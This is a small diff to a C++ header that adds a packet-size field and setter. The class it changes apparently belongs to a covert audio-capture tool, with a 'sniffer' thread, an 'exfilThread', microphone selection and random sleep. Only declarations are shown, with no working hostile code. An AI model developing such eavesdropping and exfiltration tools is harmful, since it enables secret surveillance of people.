@@ -35,6 +35,7 @@ private:
 
 public:
 	std::vector<char> globalAudioBuffer;
+	int packetSize;
 	std::mutex bufferMutex;
 	bool bRunning = true;
 	std::thread sniffer, exfilThread;
@@ -58,6 +59,7 @@ public:
 	void Stop();
 	void SetSleepMode(int mode);
 	std::vector<std::wstring> GetMicrophones();
+	void SetPacketSize(int size);
 	void ListMicrophones();
 	void SelectMicrophoneFromInt(int micIndex);
 	void RandomSleep();
